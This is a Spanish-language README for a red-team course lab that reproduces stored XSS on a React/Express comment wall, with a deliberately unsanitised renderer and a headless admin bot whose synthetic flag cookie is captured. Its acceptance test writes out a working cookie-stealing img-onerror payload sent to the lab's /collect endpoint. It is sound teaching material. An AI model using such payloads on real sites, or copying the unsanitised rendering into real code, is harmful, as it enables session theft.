# Lab XSS almacenado — Muro de comentarios (React + Express + bot admin)

Laboratorio **educativo** de seguridad web para un curso de equipo rojo. Reproduce un
**XSS almacenado** clásico (estilo PortSwigger Academy / DVWA / WebGoat): un muro de
comentarios que renderiza el texto **sin sanitizar** (`dangerouslySetInnerHTML`), y un
**bot admin** (Chromium headless, en el propio servidor) que lleva una flag **sintética**
en su cookie y visita el muro cada pocos segundos. Si un comentario contiene un payload,
este corre en la sesión del bot y manda la cookie al buzón del lab (`/collect`).

> **Marco ético.** Entorno autorizado y desechable del curso. La "víctima" es un **bot del
> propio laboratorio**, nunca una persona. Las flags son sintéticas (`FLAG{xss_stored_<sala>}`).
> No uses estas técnicas fuera de este laboratorio.

## Multi-alumno por "salas"
Una sola instancia sirve a toda la clase. Cada alumno trabaja en `?room=<su-nombre>`:
los comentarios se guardan por sala, el bot visita todas las salas con comentarios, y
`/loot?room=<sala>` muestra solo lo capturado en esa sala.

---

## Opción A — Revisar y correr en GitHub Codespaces (sin AWS)

Es la forma recomendada para **revisar la página en el entorno de desarrollo de GitHub**:

1. En el repo: botón verde **Code → Codespaces → Create codespace**.
2. Al crear el codespace, el `.devcontainer` instala Chromium, hace `npm install` y `npm run build`.
3. En la terminal del codespace:
   ```bash
   npm run lab        # arranca backend (PORT=3000) + bot admin
   ```
4. Codespaces ofrece reenviar el **puerto 3000**: ábrelo para ver el muro
   (`/board?room=test`). Para que otros alumnos entren durante la clase, en la pestaña
   **Ports** cambia la visibilidad del puerto 3000 a **Public** y comparte la URL reenviada.

> **Nota sobre GitHub Pages:** no sirve para este lab. Pages solo publica archivos
> estáticos y aquí hace falta un servidor (Express) y el bot (Puppeteer). El puerto público
> de Codespaces cubre una sesión de clase sin coste de AWS.

## Opción B — Docker local

```bash
docker compose up -d --build
# el muro queda en http://localhost/board?room=test
```

## Opción C — AWS EC2

Solo si necesitas una IP pública estable y persistente. Ver la guía del docente
(`Montaje_Sitio_Rojo_AWS_Docker_React.md`): instancia Ubuntu `t3.small`, puerto 80 abierto,
`docker compose up -d --build`, y ajustar `BASE_URL` a `http://IP_PUBLICA` en el compose.

---

## Prueba de aceptación

Con el lab corriendo (en Codespaces, `BASE` es `http://localhost:3000`; en Docker, `http://localhost`):

```bash
curl -s -X POST http://localhost:3000/api/comments -H 'Content-Type: application/json' \
  -d '{"room":"test","text":"<img src=x onerror=\"fetch(`/collect?room=test&c=`+document.cookie)\">"}'
sleep 15   # espera a que el bot admin visite la sala
curl -s "http://localhost:3000/loot?room=test"
#   -> debe aparecer una entrada con  flag=FLAG{xss_stored_test}
```

## Rutas

| Ruta | Qué hace |
|------|----------|
| `GET /board?room=NAME` | Muro de comentarios de la sala (la página React). |
| `POST /api/comments` | Guarda un comentario `{ room, text }` (sin sanitizar). |
| `GET /api/comments?room=NAME` | Lista los comentarios de la sala (JSON). |
| `GET /collect` | Buzón de exfiltración del lab; registra la query y responde un pixel. |
| `GET /loot?room=NAME` | Muestra lo capturado en `/collect` para esa sala. |

## Estructura

```
index.html          Entrada de Vite
src/App.jsx         Muro React (incluye la vulnerabilidad deliberada)
src/main.jsx        Bootstrap de React
src/styles.css      Estilos
server.js           Backend Express (API, /collect, /loot, sirve el front)
bot.js              Bot admin con Puppeteer (lleva la flag en su cookie)
Dockerfile          Imagen con Chromium para Puppeteer
docker-compose.yml  Levanta el lab en el puerto 80
.devcontainer/      Config de GitHub Codespaces (puerto 3000)
```

## Limpieza

```bash
docker compose down            # local
# en AWS, además: terminar la instancia EC2
```
